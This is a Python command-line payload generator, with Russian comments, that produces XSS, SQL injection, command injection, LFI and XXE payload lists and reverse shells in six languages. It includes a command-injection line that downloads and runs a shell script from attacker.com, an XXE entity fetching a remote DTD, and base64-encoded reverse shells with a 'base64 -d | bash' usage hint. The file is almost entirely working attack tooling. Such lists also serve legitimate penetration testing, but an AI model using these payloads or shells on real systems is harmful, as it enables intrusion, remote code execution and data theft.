#!/usr/bin/env python3
"""
Payload Generator - Генератор полезных нагрузок для тестирования
"""

import argparse
import sys
import base64
import urllib.parse
from typing import List
from utils import *

class PayloadGenerator:
    """Генератор различных пейлоадов"""
    
    def __init__(self):
        self.payloads = []
    
    def generate_xss_payloads(self, context: str = 'html') -> List[str]:
        """Генерация XSS пейлоадов"""
        print_info(f"Генерация XSS пейлоадов для контекста: {context}")
        
        xss_payloads = {
            'html': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<video src=x onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
            ],
            'attribute': [
                "' onmouseover='alert(1)",
                "\" onmouseover=\"alert(1)",
                "' onfocus='alert(1)' autofocus='",
                "' onclick='alert(1)",
                "\" onclick=\"alert(1)",
            ],
            'javascript': [
                "'-alert(1)-'",
                "\"-alert(1)-\"",
                "';alert(1);//",
                "\";alert(1);//",
                "javascript:alert(1)",
            ],
            'url': [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            ]
        }
        
        payloads = xss_payloads.get(context, xss_payloads['html'])
        
        for i, payload in enumerate(payloads, 1):
            print_info(f"[{i}] {payload}")
        
        return payloads
    
    def generate_sqli_payloads(self, dbms: str = 'generic') -> List[str]:
        """Генерация SQL injection пейлоадов"""
        print_info(f"Генерация SQL injection пейлоадов для: {dbms}")
        
        sqli_payloads = {
            'generic': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' ORDER BY 1--",
                "1' ORDER BY 2--",
                "1' ORDER BY 3--",
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND '1'='1",
                "1' AND '1'='2",
            ],
            'mysql': [
                "' OR 1=1#",
                "' UNION SELECT user(),database()#",
                "' UNION SELECT @@version,database()#",
                "' AND SLEEP(5)#",
                "' OR IF(1=1,SLEEP(5),0)#",
                "admin' AND 1=1#",
            ],
            'mssql': [
                "' OR 1=1--",
                "' UNION SELECT @@version--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND 1=1; EXEC xp_cmdshell('whoami')--",
            ],
            'postgresql': [
                "' OR 1=1--",
                "' UNION SELECT version()--",
                "'; SELECT pg_sleep(5)--",
            ]
        }
        
        payloads = sqli_payloads.get(dbms, sqli_payloads['generic'])
        
        for i, payload in enumerate(payloads, 1):
            print_info(f"[{i}] {payload}")
        
        return payloads
    
    def generate_command_injection_payloads(self, os_type: str = 'linux') -> List[str]:
        """Генерация Command Injection пейлоадов"""
        print_info(f"Генерация Command Injection пейлоадов для: {os_type}")
        
        cmd_payloads = {
            'linux': [
                "; ls",
                "| ls",
                "|| ls",
                "& ls",
                "&& ls",
                "`ls`",
                "$(ls)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; id",
                "; uname -a",
                "; whoami",
                "'; wget http://attacker.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh;'",
            ],
            'windows': [
                "& dir",
                "| dir",
                "|| dir",
                "&& dir",
                "; dir",
                "& type C:\\Windows\\win.ini",
                "| type C:\\Windows\\win.ini",
                "& whoami",
                "| whoami",
            ]
        }
        
        payloads = cmd_payloads.get(os_type, cmd_payloads['linux'])
        
        for i, payload in enumerate(payloads, 1):
            print_info(f"[{i}] {payload}")
        
        return payloads
    
    def generate_lfi_payloads(self) -> List[str]:
        """Генерация Local File Inclusion пейлоадов"""
        print_info("Генерация LFI пейлоадов")
        
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "/etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "expect://id",
            "file:///etc/passwd",
            "C:\\Windows\\win.ini",
            "..\\..\\..\\Windows\\win.ini",
            "/proc/self/environ",
            "/proc/version",
        ]
        
        for i, payload in enumerate(lfi_payloads, 1):
            print_info(f"[{i}] {payload}")
        
        return lfi_payloads
    
    def generate_xxe_payloads(self) -> List[str]:
        """Генерация XXE пейлоадов"""
        print_info("Генерация XXE (XML External Entity) пейлоадов")
        
        xxe_payloads = [
            """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
            
            """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>""",
            
            """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
]>
<foo>&xxe;</foo>""",
        ]
        
        for i, payload in enumerate(xxe_payloads, 1):
            print_info(f"[{i}]")
            print(payload)
            print()
        
        return xxe_payloads
    
    def generate_reverse_shell(self, lhost: str, lport: int, shell_type: str = 'bash') -> str:
        """Генерация reverse shell"""
        print_info(f"Генерация {shell_type} reverse shell")
        print_info(f"LHOST: {lhost}, LPORT: {lport}")
        
        shells = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'nc': f"nc -e /bin/bash {lhost} {lport}",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        }
        
        payload = shells.get(shell_type, shells['bash'])
        print_success("Payload:")
        print(payload)
        
        # Base64 encoded version
        encoded = base64.b64encode(payload.encode()).decode()
        print_success("\nBase64 encoded:")
        print(encoded)
        print_info("\nИспользование: echo 'BASE64' | base64 -d | bash")
        
        return payload
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """Кодирование пейлоада"""
        encoders = {
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'url': lambda x: urllib.parse.quote(x),
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'hex': lambda x: ''.join(format(ord(c), '02x') for c in x),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
        }
        
        if encoding in encoders:
            encoded = encoders[encoding](payload)
            print_success(f"{encoding.upper()} encoded:")
            print(encoded)
            return encoded
        else:
            print_error(f"Неизвестное кодирование: {encoding}")
            return payload

def main():
    parser = argparse.ArgumentParser(
        description="Payload Generator - Генератор пейлоадов",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  %(prog)s --xss --context html
  %(prog)s --sqli --dbms mysql
  %(prog)s --cmd-inject --os linux
  %(prog)s --lfi
  %(prog)s --xxe
  %(prog)s --reverse-shell 10.10.10.1 4444 --shell-type bash
  %(prog)s --encode "alert(1)" --encoding base64
        """
    )
    
    parser.add_argument('--xss', action='store_true', help='Генерация XSS пейлоадов')
    parser.add_argument('--context', choices=['html', 'attribute', 'javascript', 'url'],
                       default='html', help='Контекст для XSS')
    
    parser.add_argument('--sqli', action='store_true', help='Генерация SQL injection пейлоадов')
    parser.add_argument('--dbms', choices=['generic', 'mysql', 'mssql', 'postgresql'],
                       default='generic', help='Тип СУБД')
    
    parser.add_argument('--cmd-inject', action='store_true', help='Генерация Command Injection пейлоадов')
    parser.add_argument('--os', choices=['linux', 'windows'], default='linux', help='Тип ОС')
    
    parser.add_argument('--lfi', action='store_true', help='Генерация LFI пейлоадов')
    parser.add_argument('--xxe', action='store_true', help='Генерация XXE пейлоадов')
    
    parser.add_argument('--reverse-shell', metavar=('LHOST', 'LPORT'), nargs=2,
                       help='Генерация reverse shell')
    parser.add_argument('--shell-type', choices=['bash', 'nc', 'python', 'perl', 'php', 'ruby'],
                       default='bash', help='Тип shell')
    
    parser.add_argument('--encode', metavar='PAYLOAD', help='Закодировать пейлоад')
    parser.add_argument('--encoding', choices=['base64', 'url', 'double_url', 'hex', 'unicode'],
                       help='Тип кодирования')
    
    parser.add_argument('--save', action='store_true', help='Сохранить пейлоады')
    
    args = parser.parse_args()
    
    print_banner("PAYLOAD GENERATOR")
    
    generator = PayloadGenerator()
    payloads = []
    
    if args.xss:
        payloads = generator.generate_xss_payloads(args.context)
    
    elif args.sqli:
        payloads = generator.generate_sqli_payloads(args.dbms)
    
    elif args.cmd_inject:
        payloads = generator.generate_command_injection_payloads(args.os)
    
    elif args.lfi:
        payloads = generator.generate_lfi_payloads()
    
    elif args.xxe:
        payloads = generator.generate_xxe_payloads()
    
    elif args.reverse_shell:
        lhost, lport = args.reverse_shell
        payload = generator.generate_reverse_shell(lhost, int(lport), args.shell_type)
        payloads = [payload]
    
    elif args.encode:
        if not args.encoding:
            print_error("Укажите тип кодирования через --encoding")
            sys.exit(1)
        encoded = generator.encode_payload(args.encode, args.encoding)
        payloads = [encoded]
    
    else:
        parser.print_help()
        sys.exit(0)
    
    if args.save and payloads:
        save_results('\n'.join(payloads), "payloads", "txt")

if __name__ == "__main__":
    main()







